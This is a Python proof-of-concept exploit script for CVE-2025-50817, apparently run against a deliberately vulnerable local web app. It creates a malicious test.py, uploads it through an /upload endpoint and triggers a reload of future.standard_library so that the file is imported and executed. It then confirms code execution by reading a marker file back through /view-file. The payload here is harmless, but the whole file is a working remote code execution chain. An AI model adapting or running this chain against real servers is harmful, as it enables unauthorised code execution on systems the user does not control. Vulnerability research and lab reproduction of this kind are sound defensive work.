import requests
import os

# POC for CVE-2025-50817 in the vulnerable web app
# Target URL
BASE_URL = "http://localhost:5000"

# 1. Create a malicious test.py
# This file will be imported by future.standard_library in vulnerable version 1.0.0
# We'll make it create a file 'pwned_by_cve_2025_50817.txt' to prove RCE.
payload = """
import os
with open('pwned_by_cve_2025_50817.txt', 'w') as f:
    f.write('CVE-2025-50817 Exploit Successful! Code executed.')
print("[!] CVE-2025-50817: Malicious test.py executed!")
"""

with open('test.py', 'w') as f:
    f.write(payload)

print("[+] Created malicious test.py")

# 2. Upload test.py to the vulnerable app
print("[*] Uploading test.py to /upload...")
try:
    with open('test.py', 'rb') as f:
        files = {'file': f}
        response = requests.post(f"{BASE_URL}/upload", files=files)
        if response.status_code == 200:
            print("[+] Successfully uploaded test.py")
        else:
            print(f"[-] Upload failed with status code {response.status_code}")
except Exception as e:
    print(f"[-] Error during upload: {e}")

# 3. Trigger the vulnerability by reloading future.standard_library
print("[*] Triggering CVE-2025-50817 by reloading future.standard_library...")
try:
    response = requests.get(f"{BASE_URL}/reload-future")
    print(f"[+] Server response: {response.text}")
except Exception as e:
    print(f"[-] Error during triggering: {e}")

# 4. Verify if the exploit worked (check for pwned_by_cve_2025_50817.txt via /view-file)
print("[*] Verifying exploit...")
try:
    response = requests.get(f"{BASE_URL}/view-file?file=pwned_by_cve_2025_50817.txt")
    if "CVE-2025-50817 Exploit Successful!" in response.text:
        print("[SUCCESS] Exploit verified! pwned_by_cve_2025_50817.txt was created and read.")
    else:
        print("[-] Exploit verification failed. Check if the server is running on localhost:5000.")
except Exception as e:
    print(f"[-] Error during verification: {e}")

# Clean up local file
if os.path.exists('test.py'):
    os.remove('test.py')
